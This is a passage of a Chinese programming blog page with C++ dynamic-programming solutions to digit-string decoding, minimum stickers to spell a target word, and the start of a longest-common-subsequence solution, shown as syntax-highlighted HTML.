class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str, <span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == str.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ways = process(str, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; str.size() &amp;&amp; (str[i] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (str[i + <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt; <span class="hljs-number">27</span>) &#123;<br>        ways += process(str, i + <span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">number</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; str)</span> &#123;<br>    <span class="hljs-keyword">if</span> (str.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">strArr</span><span class="hljs-params">(str.begin(), str.end())</span>;<br>    <span class="hljs-keyword">return</span> process(strArr, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 从右往左的动态规划</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = s.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">dp</span><span class="hljs-params">(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span>;<br>    dp[N] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] != <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>            <span class="hljs-type">int</span> ways = dp[i + <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; N &amp;&amp; (s[i] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (s[i + <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt; <span class="hljs-number">27</span>) &#123;<br>                ways += dp[i + <span class="hljs-number">2</span>];<br>            &#125;<br>            dp[i] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">// 从左往右的动态规划</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = s.size();<br>    <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">dp</span><span class="hljs-params">(N, <span class="hljs-number">0</span>)</span>;<br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span> || s[i - <span class="hljs-number">1</span>] &gt; <span class="hljs-string">&#x27;2&#x27;</span> || (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; dp[i - <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dp[i] = (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span>) ? dp[i - <span class="hljs-number">2</span>] : <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dp[i] = dp[i - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; (s[i - <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (s[i] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt;= <span class="hljs-number">26</span>) &#123;<br>                dp[i] += (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span>) ? dp[i - <span class="hljs-number">2</span>] : <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[N - <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-comment">// 随机生成测试字符串</span><br><span class="hljs-built_in">string</span> <span class="hljs-title function_">randomString</span><span class="hljs-params">(<span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-built_in">string</span> str;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        str += (<span class="hljs-type">char</span>)(rand() % <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;0&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> str;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// 设置随机种子</span><br><br>    <span class="hljs-type">int</span> N = <span class="hljs-number">30</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">1000000</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % N;<br>        <span class="hljs-built_in">string</span> s = randomString(len);<br>        <span class="hljs-type">int</span> ans0 = number(s);<br>        <span class="hljs-type">int</span> ans1 = dp1(s);<br>        <span class="hljs-type">int</span> ans2 = dp2(s);<br>        <span class="hljs-keyword">if</span> (ans0 != ans1 || ans0 != ans2) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;number: &quot;</span> &lt;&lt; ans0 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp1: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp2: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="贴纸组组成目标最小数量"><a href="#贴纸组组成目标最小数量" class="headerlink" title="贴纸组组成目标最小数量"></a>贴纸组组成目标最小数量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//从stickers选择贴纸组组成目标最小数量并且每个贴纸的数量是无限的</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-built_in">string</span> rest = target;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : sticker) &#123;<br>            <span class="hljs-type">size_t</span> pos = rest.find(c);<br>            <span class="hljs-keyword">if</span> (pos != <span class="hljs-built_in">string</span>::npos) &#123;<br>                rest.erase(pos, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (rest.length() != target.length()) &#123;<br>            minCount = min(minCount, process1(stickers, rest));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> result = process1(stickers, target);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><br><br><span class="hljs-comment">// 使用词频统计的动态规划方法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">targetCounts</span><span class="hljs-params">(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : target) &#123;<br>        targetCounts[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>    &#125;<br><br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-keyword">if</span> (sticker[target[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">string</span> rest;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (targetCounts[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">int</span> remaining = targetCounts[i] - sticker[i];<br>                    <span class="hljs-keyword">if</span> (remaining &gt; <span class="hljs-number">0</span>) rest.append(remaining, <span class="hljs-string">&#x27;a&#x27;</span> + i); <span class="hljs-comment">//记得防止越界</span><br>                &#125;<br>            &#125;<br>            minCount = min(minCount, process2(stickers, rest));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> N = stickers.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; counts(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>));<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : stickers[i]) &#123;<br>            counts[i][c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> result = process2(counts, target);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><br><br><span class="hljs-comment">// 使用记忆化的动态规划</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target, <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-type">int</span>&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp.find(target) != dp.end()) &#123;<br>        <span class="hljs-keyword">return</span> dp[target];<br>    &#125;<br><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">targetCounts</span><span class="hljs-params">(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : target) &#123;<br>        targetCounts[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>    &#125;<br><br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-keyword">if</span> (sticker[target[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">string</span> rest;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (targetCounts[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">int</span> remaining = targetCounts[i] - sticker[i];<br>                    <span class="hljs-keyword">if</span> (remaining &gt; <span class="hljs-number">0</span>) rest.append(remaining, <span class="hljs-string">&#x27;a&#x27;</span> + i);<br>                &#125;<br>            &#125;<br>            minCount = min(minCount, process3(stickers, rest, dp));<br>        &#125;<br>    &#125;<br><br>    dp[target] = minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> dp[target];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> N = stickers.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; counts(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : stickers[i]) &#123;<br>            counts[i][c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-type">int</span>&gt; dp;<br>    dp[<span class="hljs-string">&quot;&quot;</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> result = process3(counts, target, dp);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt; stickers = &#123;<span class="hljs-string">&quot;with&quot;</span>, <span class="hljs-string">&quot;example&quot;</span>, <span class="hljs-string">&quot;science&quot;</span>&#125;;<br>    <span class="hljs-built_in">string</span> target = <span class="hljs-string">&quot;thehat&quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers1(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers2(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers3(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//样本对应模型，从结尾处讨论</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归解法，str1在0-i上和str2在0-j上的最长公共子序列</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str2, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// str1[0..0]和str2[0..0]，都只剩一个字符了，样本对应模型讨论结尾也就是i能作为和不作为答案的与j作为答案和不作为答案的情况</span><br>        <span class="hljs-keyword">return</span> str1[i] == str2[j] ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] == str2[j]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> process1(str1, str2, i, j - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] == str2[j]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> process1(str1, str2, i - <span class="hljs-number">1</span>, j);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// i != 0 &amp;&amp; j != 0</span><br>        <span class="hljs-type">int</span> p1 = process1(str1, str2, i - <span class="hljs-number">1</span>, j);<br>        <span class="hljs-type">int</span> p2 = process1(str1, str2, i, j - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + process1(str1, str2, i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)) : <span 